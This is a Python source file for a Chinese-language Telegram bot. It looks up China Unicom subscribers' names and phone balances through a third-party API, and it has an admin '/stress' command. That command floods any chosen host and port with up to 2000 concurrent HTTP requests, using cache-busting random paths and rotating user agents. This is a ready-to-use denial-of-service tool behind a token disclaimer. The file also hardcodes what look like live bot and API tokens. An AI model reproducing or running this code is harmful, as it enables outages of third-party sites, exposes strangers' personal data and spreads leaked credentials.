import os
import time
import threading
import requests
import logging
import asyncio
import aiohttp
import random
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# ===================== 日志配置 =====================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===================== 接口配置 =====================
UNICOM_API_URL = "https://newbazirim.apqak.com/api/uni/huafei/balance"
UNICOM_TOKEN = "5aaa9e12-93e4-486d-88af-5944a81fe4d7"
UNICOM_APPID = "wx7ff28b4c65afc20c"

COMMON_UA = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.75(0x18004b57) NetType/WIFI Language/zh_CN"

# ===================== 白名单配置 =====================
ALLOWED_USER_IDS = []  # 留空则所有人可用
STRESS_TEST_ADMIN_IDS = []  # 压力测试管理员白名单，仅这些用户可使用 /stress 命令

def is_allowed(user_id: int) -> bool:
    if not ALLOWED_USER_IDS:
        return True
    return user_id in ALLOWED_USER_IDS

def is_stress_test_admin(user_id: int) -> bool:
    """检查用户是否有权限使用压力测试功能"""
    if not STRESS_TEST_ADMIN_IDS:
        return False
    return user_id in STRESS_TEST_ADMIN_IDS

# ===================== 压力测试配置 =====================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/92.0.4515.107",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
]
PATHS = [f"/{i}" for i in range(1, 1001)]   # 随机路径池

# ===================== 压力测试核心类 =====================
class AsyncFlood:
    def __init__(self, target: str, port: int, https: bool = False,
                 concurrency: int = 1000, requests_per_conn: int = 100):
        """
        :param target: 目标 IP 或域名
        :param port: 端口
        :param https: 是否启用 HTTPS
        :param concurrency: 并发连接数
        :param requests_per_conn: 每个 TCP 连接上发送的请求数（Keep-Alive 复用）
        """
        self.target = target
        self.port = port
        self.proto = "https" if https else "http"
        self.url = f"{self.proto}://{target}:{port}"
        self.concurrency = concurrency
        self.requests_per_conn = requests_per_conn
        self.running = True
        self.total = 0
        self.success = 0

    async def worker(self, session: aiohttp.ClientSession):
        """单个工作协程：在一个 TCP 连接上连续发送多个请求"""
        while self.running:
            for _ in range(self.requests_per_conn):
                if not self.running:
                    return
                # 随机路径 + 随机参数，绕过缓存
                path = random.choice(PATHS) + f"?_={random.randint(1, 1000000)}"
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                try:
                    async with session.get(self.url + path, headers=headers, timeout=5) as resp:
                        self.total += 1
                        if resp.status < 400:
                            self.success += 1
                except Exception:
                    self.total += 1

    async def start(self):
        """启动并发任务"""
        connector = aiohttp.TCPConnector(
            limit=0,
            limit_per_host=self.concurrency,
            force_close=False,
            enable_cleanup_closed=True
        )
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [asyncio.create_task(self.worker(session)) for _ in range(self.concurrency)]
            await asyncio.gather(*tasks, return_exceptions=True)

    def stop(self):
        self.running = False

# ===================== 联通话费查询 =====================
def query_unicom_balance(phone_number: str):
    if len(phone_number) != 11 or not phone_number.isdigit():
        return None, "❌ 手机号格式错误，请输入11位数字"

    headers = {
        "Host": "newbazirim.apqak.com",
        "Connection": "keep-alive",
        "content-type": "application/x-www-form-urlencoded",
        "token": UNICOM_TOKEN,
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": COMMON_UA,
        "Referer": "https://servicewechat.com/wx7ff28b4c65afc20c/8/page-frame.html"
    }
    post_data = {
        "mobile": phone_number,
        "token": UNICOM_TOKEN,
        "appid": UNICOM_APPID
    }

    try:
        resp = requests.post(UNICOM_API_URL, headers=headers, data=post_data, timeout=15)
        logger.info(f"API 响应状态码: {resp.status_code}")
        logger.info(f"API 原始响应: {resp.text}")
        res_json = resp.json()

        if res_json.get("code") == 1:
            data = res_json["data"]
            return {
                "phone": phone_number,
                "name": data["name"],
                "balance": float(data["balance"]),
                "type": "联通"
            }, None
        else:
            return None, f"❌ 查询失败: {res_json.get('msg', '未知错误')}"
    except requests.exceptions.Timeout:
        return None, "❌ 请求超时，请稍后再试"
    except requests.exceptions.ConnectionError:
        return None, "❌ 网络连接失败，请检查网络"
    except Exception as e:
        return None, f"❌ 接口异常: {e}"

def format_result(info) -> str:
    balance = info['balance']
    balance_str = f"{balance:.2f} 元" if balance >= 0 else f"欠费 {abs(balance):.2f} 元"

    return (
        f"📱 <b>话费余额查询结果</b>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📡 运营商: <b>{info['type']}</b>\n"
        f"📞 手机号: <code>{info['phone']}</code>\n"
        f"👤 机主: <b>{info['name']}</b>\n"
        f"💰 余额: <b>{balance_str}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🕐 {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )

# ===================== Telegram Bot 命令 =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_allowed(user_id):
        await update.message.reply_text("❌ 抱歉，您没有权限使用此机器人。")
        return

    welcome_text = (
        "🌿 <b>贝贝查询 Bot</b>\n\n"
        "📌 <b>使用方法</b>：\n"
        "• 直接发送 <b>11位手机号</b> 即可查询余额\n"
        "• 支持批量查询，每行一个手机号\n\n"
        "📌 <b>注意事项</b>：\n"
        "• 仅支持 <b>联通</b> 手机号\n"
        "• 数据仅供参考，以运营商为准\n\n"
        "📌 <b>命令</b>：\n"
        "/start - 显示帮助\n"
        "/help - 显示帮助\n"
        "/stress - 压力测试（仅管理员）"
    )

    keyboard = [
        [InlineKeyboardButton("📞 查询示例", callback_data="example")],
        [InlineKeyboardButton("📖 使用说明", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='HTML')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_allowed(user_id):
        await update.message.reply_text("❌ 抱歉，您没有权限使用此机器人。")
        return

    help_text = (
        "📖 <b>使用说明</b>\n\n"
        "1️⃣ 直接输入 <b>11位手机号</b> 查询话费余额\n"
        "   例如：<code>18612345678</code>\n\n"
        "2️⃣ 一次查询 <b>多个号码</b>，每行一个\n"
        "3️⃣ 查询结果仅供参考\n\n"
        "🔥 <b>压力测试</b>（仅管理员）：\n"
        "发送 <code>/stress</code> 查看使用说明"
    )
    await update.message.reply_text(help_text, parse_mode='HTML')

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "example":
        await query.edit_message_text(
            "📞 <b>查询示例</b>\n\n"
            "请发送 <b>11位联通手机号</b> 进行查询\n"
            "例如: <code>18612345678</code>",
            parse_mode='HTML'
        )
    elif query.data == "help":
        await query.edit_message_text(
            "📖 <b>使用说明</b>\n\n"
            "直接发送手机号即可查询",
            parse_mode='HTML'
        )

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_allowed(user_id):
        await update.message.reply_text("❌ 抱歉，您没有权限使用此机器人。")
        return

    text = update.message.text.strip()
    lines = [line.strip() for line in text.splitlines() if line.strip()]

    # 检查是否为压力测试参数（管理员且5行参数）
    if is_stress_test_admin(user_id) and len(lines) == 5:
        await handle_stress_params(update, context)
        return

    phone_numbers = lines

    if len(phone_numbers) > 10:
        await update.message.reply_text("⚠️ 一次最多查询 10 个号码")
        return

    status_msg = await update.message.reply_text("⏳ 正在查询，请稍候...")

    results = []
    for phone in phone_numbers:
        if len(phone) == 11 and phone.isdigit():
            result, error = query_unicom_balance(phone)
            if result:
                results.append(format_result(result))
            else:
                results.append(f"❌ <code>{phone}</code>\n{error}")
        else:
            results.append(f"❌ <code>{phone}</code>\n格式错误")

    await status_msg.delete()

    if len(results) == 1:
        await update.message.reply_text(results[0], parse_mode='HTML')
    else:
        combined = "\n\n━━━━━━━━━━━━━━━━━━━\n\n".join(results)
        if len(combined) > 4096:
            for i in range(0, len(results), 3):
                batch = "\n\n━━━━━━━━━━━━━━━━━━━\n\n".join(results[i:i+3])
                await update.message.reply_text(batch, parse_mode='HTML')
        else:
            await update.message.reply_text(combined, parse_mode='HTML')

async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "❓ 请发送 <b>11位手机号</b> 查询话费余额\n"
        "或发送 <code>/help</code> 查看帮助",
        parse_mode='HTML'
    )

# ===================== 压力测试命令 =====================
async def stress_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_stress_test_admin(user_id):
        await update.message.reply_text("❌ 抱歉，您没有权限使用压力测试功能。")
        return

    help_text = (
        "🔥 <b>压力测试模式</b>\n\n"
        "请按顺序输入以下参数（每行一个）：\n"
        "1️⃣ 目标（IP 或域名）\n"
        "2️⃣ 端口（数字）\n"
        "3️⃣ 是否 HTTPS（是/否）\n"
        "4️⃣ 并发数（100-2000）\n"
        "5️⃣ 持续时间（1-57秒）\n\n"
        "⚠️ 警告：本工具仅限合法授权的安全测试使用！\n"
        "未经授权使用属于违法行为，使用者自行承担全部责任。"
    )
    await update.message.reply_text(help_text, parse_mode='HTML')

async def handle_stress_params(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_stress_test_admin(user_id):
        return

    text = update.message.text.strip()
    lines = [line.strip() for line in text.splitlines() if line.strip()]

    if len(lines) != 5:
        await update.message.reply_text(
            "❌ 参数格式错误，请输入5行参数：\n"
            "1. 目标\n"
            "2. 端口\n"
            "3. 是否HTTPS（是/否）\n"
            "4. 并发数（100-2000）\n"
            "5. 持续时间（1-57秒）"
        )
        return

    target = lines[0]
    try:
        port = int(lines[1])
    except ValueError:
        await update.message.reply_text("❌ 端口必须是数字")
        return

    https = lines[2].lower() in ['是', 'yes', 'y', 'true', '1']

    try:
        concurrency = int(lines[3])
    except ValueError:
        await update.message.reply_text("❌ 并发数必须是数字")
        return

    try:
        duration = int(lines[4])
    except ValueError:
        await update.message.reply_text("❌ 持续时间必须是数字")
        return

    # 参数验证
    if concurrency < 100 or concurrency > 2000:
        await update.message.reply_text("❌ 并发数必须在 100-2000 之间")
        return

    if duration < 1 or duration > 57:
        await update.message.reply_text("❌ 持续时间必须在 1-57 秒之间")
        return

    # 启动压力测试
    status_msg = await update.message.reply_text(
        f"🚀 <b>开始压力测试</b>\n\n"
        f"🎯 目标: {target}:{port} ({'HTTPS' if https else 'HTTP'})\n"
        f"⚡ 并发数: {concurrency}\n"
        f"⏱️ 持续时间: {duration}秒\n\n"
        f"⏳ 正在启动...",
        parse_mode='HTML'
    )

    # 在后台运行压力测试
    asyncio.create_task(run_stress_test(
        update, context, status_msg, target, port, https, concurrency, duration
    ))

async def run_stress_test(update: Update, context: ContextTypes.DEFAULT_TYPE,
                          status_msg, target: str, port: int, https: bool,
                          concurrency: int, duration: int):
    flood = AsyncFlood(target, port, https, concurrency, 100)
    start_time = time.time()

    # 启动压力测试任务
    test_task = asyncio.create_task(flood.start())

    # 实时状态更新
    update_interval = 5  # 每5秒更新一次
    last_update = 0

    while not test_task.done():
        current_time = time.time()
        elapsed = int(current_time - start_time)

        if elapsed >= duration:
            flood.stop()
            break

        if current_time - last_update >= update_interval:
            try:
                await status_msg.edit_text(
                    f"🚀 <b>压力测试进行中</b>\n\n"
                    f"🎯 目标: {target}:{port}\n"
                    f"⚡ 并发数: {concurrency}\n"
                    f"⏱️ 已运行: {elapsed}/{duration}秒\n"
                    f"📊 总请求数: {flood.total}\n"
                    f"✅ 成功请求: {flood.success}\n"
                    f"❌ 失败请求: {flood.total - flood.success}",
                    parse_mode='HTML'
                )
            except Exception:
                pass
            last_update = current_time

        await asyncio.sleep(1)

    # 等待测试完成
    try:
        await asyncio.wait_for(test_task, timeout=5)
    except asyncio.TimeoutError:
        flood.stop()

    # 发送最终报告
    elapsed = int(time.time() - start_time)
    success_rate = (flood.success / flood.total * 100) if flood.total > 0 else 0

    final_report = (
        f"🏁 <b>压力测试完成</b>\n\n"
        f"🎯 目标: {target}:{port}\n"
        f"⚡ 并发数: {concurrency}\n"
        f"⏱️ 实际运行: {elapsed}秒\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 总请求数: <b>{flood.total}</b>\n"
        f"✅ 成功请求: <b>{flood.success}</b>\n"
        f"❌ 失败请求: <b>{flood.total - flood.success}</b>\n"
        f"📈 成功率: <b>{success_rate:.2f}%</b>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"⚠️ 本工具仅限合法授权的安全测试使用"
    )

    await status_msg.edit_text(final_report, parse_mode='HTML')

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text("⚠️ 发生错误，请稍后再试")

# ===================== 健康检查服务 =====================
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write("Bot is running".encode("utf-8"))

    def log_message(self, format, *args):
        logger.info(f"健康检查: {self.address_string()} {format % args}")

def start_health_server():
    port = int(os.environ.get("PORT", 10000))
    try:
        server = ThreadingHTTPServer(("0.0.0.0", port), HealthHandler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        logger.info(f"✅ 健康检查服务已启动，监听端口 {port}")
    except OSError as e:
        logger.warning(f"⚠️ 端口 {port} 启动失败: {e}")

# ===================== 主程序 =====================
def main():
    # 从环境变量读取 Token，如果没有则使用默认值
    BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8826963365:AAEP4_yNIS6XFvQQ2EetOCjBl3lRUnyEMXo')

    if not BOT_TOKEN:
        print("❌ 错误：未设置 TELEGRAM_BOT_TOKEN 环境变量")
        print("请在 Render 的 Environment Variables 中设置")
        return

    # Render Web Service 要求监听 $PORT，否则判定部署超时
    start_health_server()

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stress", stress_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone))
    app.add_handler(MessageHandler(filters.COMMAND, unknown))
    app.add_error_handler(error_handler)

    print("🤖 Bot 已启动，正在监听消息...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == "__main__":
    main()
